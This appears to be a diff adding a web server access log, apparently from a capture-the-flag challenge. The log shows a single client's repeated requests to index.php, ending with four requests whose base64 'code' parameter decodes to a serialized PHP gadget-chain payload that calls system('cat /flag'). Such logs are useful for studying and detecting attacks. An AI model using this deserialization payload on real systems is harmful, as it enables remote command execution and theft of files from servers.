@@ -1,0 +1,34 @@
+13.78.8.14 - "GET / HTTP/1.1" 502 -
+- 
+13.78.8.14 - "GET /favicon.ico HTTP/1.1" 502 -
+- 
+13.78.8.14 - "GET / HTTP/1.1" 502 -
+- 
+13.78.8.14 - "GET / HTTP/1.1" 502 -
+- 
+13.78.8.14 - "GET /index.php HTTP/1.1" 502 -
+- 
+13.78.8.14 - "GET /index.php HTTP/1.1" 502 -
+- 
+13.78.8.14 - "GET /index.php HTTP/1.1" 502 -
+- 
+13.78.8.14 - "GET /index.php HTTP/1.1" 502 -
+- 
+13.78.8.14 - "GET /favicon.ico HTTP/1.1" 502 -
+- 
+13.78.8.14 - "GET /index.php HTTP/1.1" 502 -
+- 
+13.78.8.14 - "GET /index.php HTTP/1.1" 502 -
+- 
+13.78.8.14 - "GET /index.php HTTP/1.1" 200 -
+- 
+13.78.8.14 - "GET /favicon.ico HTTP/1.1" 200 -
+- 
+13.78.8.14 - "GET /index.php?code=TzozOiJwb3AiOjE6e3M6MzoiYWFhIjthOjM6e2k6MTtzOjY6InN5c3RlbSI7aToyO3M6OToiY2F0IC9mbGFnIjtzOjY6Im9iamVjdCI7YToyOntpOjA7Tzo0OiJlcGljIjoyOntzOjM6ImFhYSI7cjo2O3M6MTE6IgBjaGFpbgBBRktMIjtOO31pOjE7czo3OiJnZXRBRktMIjt9fX0= HTTP/1.1" 200 -
+- 
+13.78.8.14 - "GET /index.php?code=TzozOiJwb3AiOjI6e3M6MzoiYWFhIjthOjM6e2k6MTtzOjY6InN5c3RlbSI7aToyO3M6OToiY2F0IC9mbGFnIjtzOjY6Im9iamVjdCI7YToyOntpOjA7Tzo0OiJlcGljIjoyOntzOjM6ImFhYSI7cjo2O3M6MTE6IgBjaGFpbgBBRktMIjtOO31pOjE7czo3OiJnZXRBRktMIjt9fX0= HTTP/1.1" 200 -
+- 
+13.78.8.14 - "GET /index.php?code=TzozOiJwb3AiOjI6e3M6MzoiYWFhIjthOjM6e2k6MTtzOjY6InN5c3RlbSI7aToyO3M6OToiY2F0IC9mbGFnIjtzOjY6Im9iamVjdCI7YToyOntpOjA7Tzo0OiJlcGljIjoyOntzOjM6ImFhYSI7cjo2O3M6MTE6IgBjaGFpbgBBRktMIjtiOjE7fWk6MTtzOjc6ImdldEFGS0wiO319fQ== HTTP/1.1" 200 -
+- 
+13.78.8.14 - "GET /index.php?code=TzozOiJwb3AiOjI6e3M6MzoiYWFhIjthOjM6e2k6MTtzOjY6InN5c3RlbSI7aToyO3M6OToiY2F0IC9mbGFnIjtzOjY6Im9iamVjdCI7YToyOntpOjA7Tzo0OiJlcGljIjoyOntzOjM6ImFhYSI7cjo2O3M6MTE6IgBjaGFpbgBBRktMIjtiOjE7fWk6MTtzOjc6ImdldEFGS0wiO319fQ== HTTP/1.1" 200 -
+- 
